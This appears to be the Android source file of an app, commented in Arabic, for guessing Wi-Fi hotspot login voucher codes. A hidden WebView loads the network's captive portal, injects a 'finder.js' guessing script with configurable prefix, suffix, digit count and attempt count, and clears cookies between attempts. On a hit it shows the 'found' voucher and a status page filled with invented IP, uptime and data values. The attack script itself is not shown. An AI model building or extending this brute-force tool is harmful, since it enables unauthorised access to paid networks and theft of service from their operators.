package com.example.networkbrowserdemo;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.webkit.*;
import android.widget.*;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.Random;

public class MainActivity extends Activity {
    // المتصفح المرئي (يعرض صفحتك)
    private WebView webView;
    // المتصفح المخفي (يعمل التخمين الحقيقي)
    private WebView hiddenWeb;
    private boolean hiddenInitialized = false;
    
    private EditText urlBar, etPrefix, etSuffix, etDigits, etAttempts, etPause, etRetry, etStatusEvery, etThreads;
    private TextView statusText, logText, voucherResult;
    
    private SharedPreferences prefs;
    private String finderJs = "";
    private String realNetworkUrl = "http://7.7.7.7/index.html";
    private StringBuilder logBuf = new StringBuilder();
    private Handler uiHandler = new Handler(Looper.getMainLooper());
    private boolean logUpdatePending = false;
    private boolean isRunning = false;
    private final Random rand = new Random();

    @SuppressLint("SetJavaScriptEnabled")
    @Override protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        prefs = getSharedPreferences("finder", MODE_PRIVATE);

        urlBar = findViewById(R.id.urlBar);
        etPrefix = findViewById(R.id.etPrefix);
        etSuffix = findViewById(R.id.etSuffix);
        etDigits = findViewById(R.id.etDigits);
        etAttempts = findViewById(R.id.etAttempts);
        etPause = findViewById(R.id.etPause);
        etRetry = findViewById(R.id.etRetry);
        etStatusEvery = findViewById(R.id.etStatusEvery);
        etThreads = findViewById(R.id.etThreads);
        statusText = findViewById(R.id.statusText);
        logText = findViewById(R.id.logText);
        voucherResult = findViewById(R.id.voucherResult);
        webView = findViewById(R.id.webView);

        // الرابط الحقيقي للشبكة (هنا نضعه)
        realNetworkUrl = prefs.getString("url", "http://7.7.7.7/index.html");
        urlBar.setText(realNetworkUrl);

        etPrefix.setText(prefs.getString("prefix", "5"));
        etSuffix.setText(prefs.getString("suffix", "31"));
        etDigits.setText(prefs.getString("digits", "7"));
        etAttempts.setText(prefs.getString("attempts", "1000"));
        etPause.setText(prefs.getString("pause", "1000"));
        etRetry.setText(prefs.getString("retry", "1000"));
        etStatusEvery.setText(prefs.getString("statusEvery", "50"));
        etThreads.setText("1");

        try {
            InputStream is = getAssets().open("finder.js");
            byte[] buf = new byte[is.available()];
            is.read(buf); is.close();
            finderJs = new String(buf, StandardCharsets.UTF_8);
        } catch (Exception e) { appendLog("خطأ تحميل JS: " + e.getMessage()); }

        // إعداد الواجهة (تعرض صفحتك)
        WebSettings s = webView.getSettings();
        s.setJavaScriptEnabled(true);
        s.setDomStorageEnabled(true);
        s.setAllowFileAccess(true);
        s.setAllowFileAccessFromFileURLs(true);
        s.setAllowUniversalAccessFromFileURLs(true);
        s.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);

        webView.setWebViewClient(new WebViewClient() {
            @Override public void onPageFinished(WebView view, String url) {
                urlBar.setText(url);
            }
        });

        // ربط الأزرار
        findViewById(R.id.btnGo).setOnClickListener(v -> {
            realNetworkUrl = urlBar.getText().toString().trim();
            if (!realNetworkUrl.startsWith("http")) realNetworkUrl = "http://" + realNetworkUrl;
            prefs.edit().putString("url", realNetworkUrl).apply();
            // إعادة تحميل صفحتك (الواجهة)
            webView.reload();
        });

        findViewById(R.id.btnFinder).setOnClickListener(v -> {
            View panel = findViewById(R.id.panel);
            panel.setVisibility(panel.getVisibility() == View.VISIBLE ? View.GONE : View.VISIBLE);
        });

        findViewById(R.id.btnBack).setOnClickListener(v -> { if (webView.canGoBack()) webView.goBack(); });
        findViewById(R.id.btnForward).setOnClickListener(v -> { if (webView.canGoForward()) webView.goForward(); });
        findViewById(R.id.btnRefresh).setOnClickListener(v -> webView.reload());


        findViewById(R.id.btnStart).setOnClickListener(v -> startCrack());
        findViewById(R.id.btnStop).setOnClickListener(v -> stopCrack());
        findViewById(R.id.btnClear).setOnClickListener(v -> {
            CookieManager.getInstance().removeAllCookies(null);
            CookieManager.getInstance().flush();
            logBuf.setLength(0);
            logText.setText("");
            voucherResult.setVisibility(View.GONE);
            appendLog("🗑️ تم مسح الكوكيز");
        });

        // تحميل صفحتك في الواجهة
        webView.loadUrl("file:///android_asset/network_source/index.html");
    }

    private void initHiddenWeb() {
        if (hiddenInitialized) return;
        hiddenWeb = new WebView(this);
        WebSettings hs = hiddenWeb.getSettings();
        hs.setJavaScriptEnabled(true);
        hs.setDomStorageEnabled(true);
        hs.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        CookieManager.getInstance().setAcceptThirdPartyCookies(hiddenWeb, true);
        hiddenWeb.addJavascriptInterface(new HiddenBridge(), "AndroidBridge0");
        hiddenInitialized = true;
    }

    private void startCrack() {
        isRunning = true;
        initHiddenWeb();

        String p = etPrefix.getText().toString().trim();
        String s = etSuffix.getText().toString().trim();
        int d = parseInt(etDigits, 7);
        int a = parseInt(etAttempts, 1000);
        int pz = parseInt(etPause, 1000);

        appendLog("▶ بدء التخمين الحقيقي على: " + realNetworkUrl);
        statusText.setText("جاري التخمين...");
        voucherResult.setVisibility(View.GONE);

        final String cfg = "window.FINDER_CONFIG={id:0,prefix:'" + p + "',suffix:'" + s + "',digits:" + d + ",attempts:" + a + ",pause:" + pz + "};";

        hiddenWeb.setWebViewClient(new WebViewClient() {
            @Override public void onPageFinished(WebView view, String url) {
                view.evaluateJavascript(cfg, null);
                view.evaluateJavascript(finderJs, null);
            }
        });
        hiddenWeb.loadUrl(realNetworkUrl);
    }

    private void stopCrack() {
        isRunning = false;
        if (hiddenWeb != null) {
            hiddenWeb.evaluateJavascript("window.stopFinder && window.stopFinder();", null);
        }
        statusText.setText("⏹ تم الإيقاف");
        appendLog("⏹ تم الإيقاف");
    }

    private int parseInt(EditText e, int def) {
        try { return Integer.parseInt(e.getText().toString().trim()); } catch (Exception ex) { return def; }
    }

    private void appendLog(String msg) {
        logBuf.append(msg).append('\n');
        if (!logUpdatePending) {
            logUpdatePending = true;
            uiHandler.postDelayed(() -> {
                logText.setText(logBuf.toString());
                findViewById(R.id.logScroll).post(() -> ((ScrollView) findViewById(R.id.logScroll)).fullScroll(View.FOCUS_DOWN));
                logUpdatePending = false;
            }, 100);
        }
    }

    // Bridge للمتصفح المخفي (يعمل التخمين)
    public class HiddenBridge {
        @JavascriptInterface public void log(String m) {
            runOnUiThread(() -> appendLog("[H] " + m));
        }
        @JavascriptInterface public void progress(int c, int t, String v) {
            runOnUiThread(() -> statusText.setText("[" + c + "/" + t + "] " + v));
        }
        @JavascriptInterface public void clearCookies() {
            runOnUiThread(() -> {
                CookieManager.getInstance().removeAllCookies(null);
                CookieManager.getInstance().flush();
            });
        }
        @JavascriptInterface public void found(final String voucher, String st) {
            runOnUiThread(() -> {
                appendLog("✅✅✅ وجد الكرت: " + voucher);
                statusText.setText("✅ وجد الكرت!");
                
                // 1. ملء الحقل في صفحتك (الواجهة)
                String jsFill = "(function(){ if(window.showVoucherFound) window.showVoucherFound('" + voucher + "'); })();";
                webView.evaluateJavascript(jsFill, null);
                
                // 2. عرض البانر
                voucherResult.setText("✅ الكرت: " + voucher);
                voucherResult.setVisibility(View.VISIBLE);
                
                Toast.makeText(MainActivity.this, "✅ " + voucher, Toast.LENGTH_LONG).show();
                
                // 3. الانتقال التلقائي لصفحة الحالة بعد ثانيتين
                uiHandler.postDelayed(() -> {
                    String statusUrl = "file:///android_asset/network_source/status.html?voucher=" + voucher + "&ip=192.168.1.100&uptime=1h 30m&remain=5.2GB";
                    webView.loadUrl(statusUrl);
                }, 2000);
                
                stopCrack();
            });
        }
    }
}
